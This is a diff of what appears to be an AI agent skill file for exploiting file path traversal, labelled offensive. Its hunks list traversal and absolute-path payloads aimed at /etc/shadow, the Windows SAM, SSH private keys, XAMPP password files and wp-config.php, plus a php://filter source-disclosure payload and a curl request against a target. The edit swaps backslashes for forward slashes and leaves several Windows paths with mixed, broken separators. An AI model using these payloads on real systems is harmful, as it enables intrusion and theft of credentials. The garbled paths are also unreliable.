@@ -1,6 +1,6 @@
 ---
 name: file-path-traversal
-description: "Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code."
+description: Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. Use when the task involves file path traversal.
 risk: offensive
 source: community
 author: zebbern
@@ -108,8 +108,8 @@ Common vulnerable functionality:
 ../../../../../../etc/passwd
 
 # Windows traversal
-..\..\..\windows\win.ini
-..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\../windows/win.ini
+..\..\..\../windows/system32/drivers/etc/hosts
 
 # URL encoded
 ..%2F..%2F..%2Fetc%2Fpasswd
@@ -130,9 +130,9 @@ curl "http://target.com/download?file=....//....//....//etc/passwd"
 /proc/self/environ
 
 # Direct absolute path (Windows)
-C:\windows\win.ini
-C:\windows\system32\drivers\etc\hosts
-C:\boot.ini
+C:/windows/win.ini
+C:/windows/system32/drivers/etc/hosts
+C:/boot.ini
 ```
 
 ### Phase 4: Bypass Techniques
@@ -249,27 +249,27 @@ Windows-specific targets:
 
 ```bash
 # System files
-C:\windows\win.ini
-C:\windows\system.ini
-C:\boot.ini
-C:\windows\system32\drivers\etc\hosts
-C:\windows\system32\config\SAM
-C:\windows\repair\SAM
+C:/windows/win.ini
+C:/windows/system.ini
+C:/boot.ini
+C:/windows/system32/drivers/etc/hosts
+C:/windows/system32/config/SAM
+C:/windows/repair/SAM
 
 # IIS files
-C:\inetpub\wwwroot\web.config
-C:\inetpub\logs\LogFiles\W3SVC1\
+C:/inetpub/wwwroot/web.config
+C:/inetpub/logs/LogFiles/W3SVC1\
 
 # Configuration files
-C:\xampp\apache\conf\httpd.conf
-C:\xampp\mysql\data\mysql\user.MYD
-C:\xampp\passwords.txt
-C:\xampp\phpmyadmin\config.inc.php
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/mysql/data/mysql/user.MYD
+C:/xampp/passwords.txt
+C:/xampp/phpmyadmin/config.inc.php
 
 # User files
-C:\Users\<user>\.ssh\id_rsa
-C:\Users\<user>\Desktop\
-C:\Documents and Settings\<user>\
+C:/Users\<user>\.ssh/id_rsa
+C:/Users\<user>/Desktop\
+C:/Documents and Settings\<user>\
 ```
 
 ### Phase 7: Automated Testing
@@ -438,7 +438,7 @@ def safe_file_access(base_dir, filename):
 | Payload | Target |
 |---------|--------|
 | `../../../etc/passwd` | Linux password file |
-| `..\..\..\..\windows\win.ini` | Windows INI file |
+| `..\..\..\../windows/win.ini` | Windows INI file |
 | `....//....//....//etc/passwd` | Bypass simple filter |
 | `/etc/passwd` | Absolute path |
 | `php://filter/convert.base64-encode/resource=config.php` | Source code |
@@ -450,8 +450,8 @@ def safe_file_access(base_dir, filename):
 | Linux | `/etc/passwd` | User accounts |
 | Linux | `/etc/shadow` | Password hashes |
 | Linux | `/proc/self/environ` | Environment vars |
-| Windows | `C:\windows\win.ini` | System config |
-| Windows | `C:\boot.ini` | Boot config |
+| Windows | `C:/windows/win.ini` | System config |
+| Windows | `C:/boot.ini` | Boot config |
 | Web | `wp-config.php` | WordPress DB creds |
 
 ### Encoding Variants
